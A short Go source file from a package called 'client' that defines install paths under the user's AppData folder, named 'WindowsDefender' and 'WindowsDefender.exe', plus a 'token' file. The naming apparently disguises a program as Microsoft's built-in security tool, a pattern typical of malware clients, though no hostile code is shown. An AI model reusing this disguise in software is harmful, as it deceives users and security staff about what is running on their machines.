package client

import (
	"os"
	"path/filepath"
)

var (
	Path         = filepath.Join(os.ExpandEnv("$AppData"), "WindowsDefender")
	PathExe      = filepath.Join(Path, "WindowsDefender.exe")
	HostnamePath = filepath.Join(Path, "token")
)
